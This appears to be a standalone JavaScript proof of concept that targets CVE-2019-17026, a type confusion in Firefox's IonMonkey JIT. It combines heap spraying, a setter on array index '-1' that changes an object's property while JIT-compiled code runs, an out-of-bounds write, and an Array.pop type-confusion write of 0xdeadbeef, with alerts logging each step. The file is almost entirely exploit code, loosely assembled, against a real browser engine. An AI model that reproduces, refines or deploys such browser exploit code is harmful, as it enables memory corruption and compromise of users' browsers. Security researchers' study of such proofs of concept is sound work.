// Combined POC for CVE-2019-17026 and IonMonkey Array.pop
const NUM_ITERATIONS = 10;
const ARRAY_LENGTH = 1000;
const SPRAY_SIZE = 100000;

let OBJ = { a: 41 };
OBJ.a = 42;
let TARGET = { secret: 0x12345678 };
let ab = new ArrayBuffer(0x1000);
let y = new Uint32Array(ab);
let BUFFER = new Array(1000000); // Heap Spray base
let spray = new Array(SPRAY_SIZE).fill({ data: y });

function f(obj, idx, targetAddr) {
    let v = OBJ.a;
    alert('Before write, OBJ.a = ' + OBJ.a);
    obj[idx] = v;
    if (targetAddr && idx === -1) {
        try {
            obj[-1] = targetAddr;
            alert('Attempted to write TARGET to obj[-1]: ' + targetAddr.secret);
        } catch (e) {
            alert('Error writing to obj[-1]: ' + e);
        }
    }
    // محاولة Array.pop
    const v11 = obj.pop();
    try {
        v11[0] = 0xdeadbeef;
        alert('Write to v11[0] succeeded with value: ' + v11[0].toString(16));
    } catch (e) {
        alert('Pop Crash or Type Confusion: ' + e);
    }
    alert('After write, OBJ.a = ' + OBJ.a);
    return OBJ.a;
}

function main() {
    for (let i = 0; i < NUM_ITERATIONS; i++) {
        let isLastIteration = i === NUM_ITERATIONS - 1;
        let idx = isLastIteration ? -1 : ARRAY_LENGTH;

        let obj = new Array(ARRAY_LENGTH);
        Object.defineProperty(obj, '-1', {
            set(value) {
                alert('Setter triggered, changing OBJ.a to 1337');
                OBJ.a = 1337;
            }
        });

        for (let j = 0; j < ARRAY_LENGTH; j++) {
            if (j === ARRAY_LENGTH / 2) continue;
            obj[j] = j;
        }

        let r = f(obj, idx, isLastIteration ? TARGET : null);
        alert('Iteration ' + i + ': Result = ' + r);
    }
    alert('Final OBJ.a = ' + OBJ.a);
    alert('TARGET.secret = ' + TARGET.secret);
    alert('y[0] = ' + y[0].toString(16));
}

main();